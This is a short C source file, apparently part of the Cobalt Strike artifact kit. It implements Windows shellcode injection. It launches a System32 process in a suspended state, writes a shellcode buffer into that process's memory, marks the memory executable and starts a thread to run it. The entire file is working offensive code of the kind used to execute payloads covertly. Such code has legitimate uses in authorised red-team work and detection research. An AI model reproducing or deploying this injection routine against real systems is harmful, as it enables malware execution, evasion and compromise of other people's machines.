/*
 * (c) 2017 Strategic Cyber LLC
 *
 * See https://www.cobaltstrike.com/license
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

/* defined in start_thread.c */
void start_thread(HANDLE hProcess, PROCESS_INFORMATION pi, LPVOID lpStartAddress);

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void inject_process(HANDLE hProcess, PROCESS_INFORMATION pi, LPCVOID buffer, SIZE_T length) {
	LPVOID ptr;
	SIZE_T wrote;
	DWORD  old;

	/* allocate memory in our process */
	ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length + 128, MEM_COMMIT, PAGE_READWRITE);

	/* write our shellcode to the process */
	WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&wrote);
	if (wrote != length)
		return;

	/* change permissions */
	VirtualProtectEx(hProcess, ptr, length, PAGE_EXECUTE_READ, &old);

	/* create a thread in the process */
	start_thread(hProcess, pi, ptr);
}

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void inject(LPCVOID buffer, int length, char * processname) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hProcess   = NULL;
	char lbuffer[1024];
	char cmdbuff[1024];

	if (processname == NULL || strlen(processname) == 0) {
		hProcess = GetCurrentProcess();
	}
	else {
		/* reset some stuff */
		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si);
		ZeroMemory( &pi, sizeof(pi) );

		/* resolve windir? */
		GetEnvironmentVariableA("windir", lbuffer, 1024);

		/* setup our path... choose wisely for 32bit and 64bit platforms */
		_snprintf(cmdbuff, 1024, "%s\\System32\\%s", lbuffer, processname);

		/* spawn it baby! */
		if (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
			return;

		hProcess = pi.hProcess;
	}

	if( !hProcess )
		return;

	inject_process(hProcess, pi, buffer, length);
}
